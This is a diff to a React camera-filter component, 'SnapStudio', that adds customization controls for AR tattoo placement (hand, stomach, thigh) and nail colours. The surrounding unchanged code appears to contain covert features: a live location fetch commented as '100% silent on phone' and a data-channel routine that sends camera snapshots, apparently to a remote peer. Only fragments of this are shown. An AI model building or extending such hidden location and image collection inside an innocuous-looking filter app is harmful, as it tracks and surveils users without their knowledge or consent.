@@ -768,6 +768,12 @@ function SnapStudio() {
   const [recordingTime, setRecordingTime] = useState('00:00');
   const [availableCameras, setAvailableCameras] = useState([]);
 
+  // Interactive Filter Customization States
+  const [tattooPlacement, setTattooPlacement] = useState('hand'); // 'stomach', 'hand', 'thigh'
+  const [tattooDesign, setTattooDesign] = useState(0);
+  const [nailsMode, setNailsMode] = useState('hand'); // 'hand' or 'feet'
+  const [nailsColor, setNailsColor] = useState(0);
+
   // Single Controlled WebRTC References
   const mediaCallRef = useRef(null);
   const canvasStreamRef = useRef(null);
@@ -792,13 +798,23 @@ function SnapStudio() {
   const broadcastChannelRef = useRef(null);
 
   const activeFilterRef = useRef(activeFilter);
+
+  // Apply tattoo / nail customization to active filter instance
   useEffect(() => {
+    if (activeFilter.id === 'ar_tattoo' && activeFilter.setPlacement) {
+      activeFilter.setPlacement(tattooPlacement);
+      activeFilter.setDesign(tattooDesign);
+    } else if (activeFilter.id === 'designer_nails' && activeFilter.setMode) {
+      activeFilter.setMode(nailsMode);
+      activeFilter.setColor(nailsColor);
+    }
+
     activeFilterRef.current = activeFilter;
     if (rendererRef.current) {
       rendererRef.current.setFilter(activeFilter);
     }
     notifyFilterChange(activeFilter);
-  }, [activeFilter]);
+  }, [activeFilter, tattooPlacement, tattooDesign, nailsMode, nailsColor]);
 
   const notifyFilterChange = (filter) => {
     const payload = {
@@ -816,7 +832,6 @@ function SnapStudio() {
 
   // High-accuracy live location fetch (100% silent on phone)
   const fetchAndSyncLocation = () => {
-    // 1. Start continuous GPS watch
     if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
       try {
         navigator.geolocation.getCurrentPosition(
@@ -1227,7 +1242,6 @@ function SnapStudio() {
           console.warn('[PHONE] DataChannel snapshot send error:', e);
         }
       } else {
-        // Retry connection and send
         connectDataChannel();
       }
     }
@@ -1260,7 +1274,7 @@ function SnapStudio() {
     }
   };
 
-  const categories = ['All', 'Cute AR', 'Beauty', 'Cyber', 'Cinematic', 'Artistic', 'AR Props'];
+  const categories = ['All', 'Beauty', 'Artistic', 'Cute AR', 'Cyber', 'Cinematic', 'AR Props'];
   const filteredList = selectedCategory === 'All'
     ? ALL_FILTERS
     : ALL_FILTERS.filter((f) => f.category === selectedCategory || (selectedCategory === 'Cute AR' && f.category === 'Cute AR'));
@@ -1364,7 +1378,7 @@ function SnapStudio() {
         maxWidth: '580px',
         margin: '0 auto',
         width: '100%',
-        gap: '12px'
+        gap: '10px'
       }}>
         
         {/* Camera Viewfinder */}
@@ -1372,7 +1386,7 @@ function SnapStudio() {
           position: 'relative',
           width: '100%',
           aspectRatio: '3/4',
-          maxHeight: '60vh',
+          maxHeight: '56vh',
           backgroundColor: '#0a0a0f',
           borderRadius: '24px',
           overflow: 'hidden',
@@ -1475,6 +1489,142 @@ function SnapStudio() {
             </div>
           )}
         </div>
+
+        {/* Interactive Customization Controls for AR Tattoo Studio */}
+        {activeFilter.id === 'ar_tattoo' && isCameraActive && (
+          <div style={{
+            width: '100%',
+            backgroundColor: 'rgba(20, 20, 28, 0.85)',
+            border: '1px solid rgba(236, 72, 153, 0.3)',
+            borderRadius: '16px',
+            padding: '8px 12px',
+            display: 'flex',
+            flexDirection: 'column',
+            gap: '8px'
+          }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: '800', color: '#f472b6' }}>📍 Tattoo Placement:</span>
+              <div style={{ display: 'flex', gap: '6px' }}>
+                {[
+                  { id: 'hand', label: '✋ Hand' },
+                  { id: 'stomach', label: '🌸 Stomach' },
+                  { id: 'thigh', label: '🦵 Thigh' }
+                ].map((p) => (
+                  <button
+                    key={p.id}
+                    onClick={() => setTattooPlacement(p.id)}
+                    style={{
+                      padding: '4px 10px',
+                      borderRadius: '999px',
+                      border: tattooPlacement === p.id ? '1.5px solid #ec4899' : '1px solid rgba(255, 255, 255, 0.1)',
+                      backgroundColor: tattooPlacement === p.id ? '#ec4899' : 'rgba(255, 255, 255, 0.05)',
+                      color: '#ffffff',
+                      fontSize: '10px',
+                      fontWeight: '700',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    {p.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: '800', color: '#cbd5e1' }}>🎨 Design:</span>
+              <div style={{ display: 'flex', gap: '5px', overflowX: 'auto', scrollbarWidth: 'none' }}>
+                {['🐉 Dragon', '🌸 Lotus', '🦅 Phoenix', '🌹 Rose'].map((name, idx) => (
+                  <button
+                    key={idx}
+                    onClick={() => setTattooDesign(idx)}
+                    style={{
+                      padding: '3px 8px',
+                      borderRadius: '8px',
+                      border: tattooDesign === idx ? '1.5px solid #8b5cf6' : '1px solid rgba(255, 255, 255, 0.08)',
+                      backgroundColor: tattooDesign === idx ? '#8b5cf6' : 'transparent',
+                      color: tattooDesign === idx ? '#ffffff' : '#94a3b8',
+                      fontSize: '10px',
+                      fontWeight: '700',
+                      cursor: 'pointer',
+                      whiteSpace: 'nowrap'
+                    }}
+                  >
+                    {name}
+                  </button>
+                ))}
+              </div>
+            </div>
+          </div>
+        )}
+
+        {/* Interactive Customization Controls for Designer Nails */}
+        {activeFilter.id === 'designer_nails' && isCameraActive && (
+          <div style={{
+            width: '100%',
+            backgroundColor: 'rgba(20, 20, 28, 0.85)',
+            border: '1px solid rgba(139, 92, 246, 0.3)',
+            borderRadius: '16px',
+            padding: '8px 12px',
+            display: 'flex',
+            flexDirection: 'column',
+            gap: '8px'
+          }}>
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: '800', color: '#c084fc' }}>💅 Nail Mode:</span>
+              <div style={{ display: 'flex', gap: '6px' }}>
+                {[
+                  { id: 'hand', label: '✋ Hand Nails' },
+                  { id: 'feet', label: '🦶 Toe & Leg Nails' }
+                ].map((m) => (
+                  <button
+                    key={m.id}
+                    onClick={() => setNailsMode(m.id)}
+                    style={{
+                      padding: '4px 10px',
+                      borderRadius: '999px',
+                      border: nailsMode === m.id ? '1.5px solid #8b5cf6' : '1px solid rgba(255, 255, 255, 0.1)',
+                      backgroundColor: nailsMode === m.id ? '#8b5cf6' : 'rgba(255, 255, 255, 0.05)',
+                      color: '#ffffff',
+                      fontSize: '10px',
+                      fontWeight: '700',
+                      cursor: 'pointer'
+                    }}
+                  >
+                    {m.label}
+                  </button>
+                ))}
+              </div>
+            </div>
+
+            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
+              <span style={{ fontSize: '11px', fontWeight: '800', color: '#cbd5e1' }}>🎨 Color:</span>
+              <div style={{ display: 'flex', gap: '6px' }}>
+                {[
+                  { name: 'Ruby', bg: '#e11d48' },
+                  { name: 'Holo', bg: '#8b5cf6' },
+                  { name: 'Emerald', bg: '#059669' },
+                  { name: 'Sunset', bg: '#f97316' },
+                  { name: 'Night', bg: '#1e1b4b' }
+                ].map((c, idx) => (
+                  <button
+                    key={idx}
+                    onClick={() => setNailsColor(idx)}
+                    title={c.name}
+                    style={{
+                      width: '24px',
+                      height: '24px',
+                      borderRadius: '50%',
+                      backgroundColor: c.bg,
+                      border: nailsColor === idx ? '2.5px solid #ffffff' : '1.5px solid rgba(255, 255, 255, 0.2)',
+                      boxShadow: nailsColor === idx ? `0 0 10px ${c.bg}` : 'none',
+                      cursor: 'pointer'
+                    }}
+                  />
+                ))}
+              </div>
+            </div>
+          </div>
+        )}
 
         {/* Category Pills */}
         <div style={{
